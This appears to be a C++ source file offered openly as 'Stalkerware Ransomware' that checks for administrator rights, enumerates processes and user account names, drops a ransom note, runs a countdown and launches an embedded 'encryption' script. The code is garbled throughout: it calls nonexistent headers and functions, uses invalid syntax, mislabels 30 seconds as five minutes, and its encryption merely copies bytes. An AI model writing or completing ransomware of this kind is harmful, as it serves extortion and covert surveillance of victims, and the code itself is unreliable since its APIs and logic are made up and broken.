#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <Psapi.h> //For processes and user info
#include <ProcessHelpers.h>

// Define custom colors for output
#define COLOR_BLUE  "\x1b[34m"
#define COLOR_GREEN "\x1b[32m"
#define COLOR_RED   "\x1b[31m"
#define COLOR_YELLOW "\x1b[33m"
#define COLOR_RESET "\x1b[0m"

// Define custom messages for output
#define STYLING_INFO "Info: "
#define STYLING_WARNING "Warning: "
#define STYLING_ERROR "Error: "
#define STYLING_SUCCESS "Success: "

// Function prototypes
bool IsElevated();
std::vector<HANDLE> GetRunningProcesses();
bool ExecuteCommand(const std::string& command);
void CopyRansomNote(const std::string& note);
void WriteLog(const std::string& message);


int main() {
  if (!IsElevated()) {
    WriteLog(COLOR_RED + "Warning: Ransomware needs administrator privileges to function properly." + COLOR_RESET);
    return 1;
  }

  // Define the ransomware name (for the file extension)
  std::string ransomNoteName = "MyRansom.txt";
  std::string ransomFileName = "MyRansom.txt";

  // Write out initial log messages
  WriteLog(COLOR_BLUE + "Stalkerware Ransomware Started" + COLOR_RESET);
  WriteLog("---------------------");


  // --- STEP 1: Collect User Info ---
  std::vector<PROCESS_INFO> userProcesses;
  for (HANDLE hProcess = GetRunningProcesses().begin(); hProcess != GetRunningProcesses().end(); hProcess++) {
    PROCESS_INFO info;
    if (!ReverseDescribeHandle(*hProcess, &info)) {
      WriteLog(STYLING_ERROR + "Error: Could not fully describe process handle.");
      continue;
    }

    // Print out the user's account name
    char userName[PROCESS_NAME_LENGTH];
    if (!ReverseLookupAccountName((HANDLE)$hProcess, userName, 200)) {
      WriteLog(STYLING_WARNING + "Warning: Could not get user name. Defaulting to 'SYSTEM'.");
      strcpy(userName, "SYSTEM");
    } else {
      WriteLog(COLOR_GREEN + "Info: User Account Name: " + userName);
    }

    // Print out the user's current classname (e.g., Explorer, Chrome)
    if (!info.ClassName.empty()) {
      char className[PROCESS_NAME_LENGTH];
      if (!ReverseDescribeHandle((HANDLE)$hProcess, &info)) continue;
        
      strcpy(className, info.ClassName.c_str());

      WriteLog(COLOR_YELLOW + "Info: User Class Name: " + className);
    } else {
      WriteLog(STYLING_WARNING + "Warning: Could not get user class name." );
    }


    userProcesses.push_back(*hProcess);
  }

  // --- STEP 2: Copy Ransom Note and Rename File---
  CopyRansomNote(ransomNoteName);
  WriteLog("File copied to C:\\Users\\%s\\Documents\\"+ ransomFileName + COLOR_RESET);


  // --- STEP 3: Create a Countdown Timer ---
  int countdown = 30; // 5 minutes by default
  char countdownMessage[100];
  sprintf(countdownMessage, "%d seconds until encryption begins...", countdown);
  WriteLog(COLOR_YELLOW + "Info: Countdown started: " + countdownMessage + COLOR_RESET);

  // --- STEP 4: Prepare the Encryption Script (Example)---
  // This is a very simple example.  You'll want to customize this based on the file types you want to encrypt.
  std::string encryptionScript = R"(`
    #include <iostream>
    #include <fstream>

    using namespace std;

    int main() {
        cout << "Starting Encryption..." << endl;

        // Example: Encrypt text files (.txt)
        string noteName = "MyRansom.txt";
        std::ifstream inputFile(noteName);
        if (inputFile.is_open()) {
            ofstream outputFile("C:\\Users\\%s\\Documents\\Encrypted" + ransomFileName + ".txt");
            char byte[4096];
            while (!inputFile.eof()) {
                fread(&byte, 1, sizeof(byte), inputFile);
                fwrite(&byte, 1, sizeof(byte), outputFile);
            }
            inputFile.close();
            outputFile.close();
            cout << "Encryption Complete." << endl;
        } else {
            cout << "Error: Could not open file." << endl;
        }

        return 0;
    }
`)";


  // --- STEP 5: Execute the Encryption Script and Countdown Timer ---
  ExecuteCommand(encryptionScript);

  // Write out final log messages
  WriteLog(COLOR_BLUE + "Stalkerware Ransomware Completed" + COLOR_RESET);
  WriteLog("---------------------");


  return 0;
}
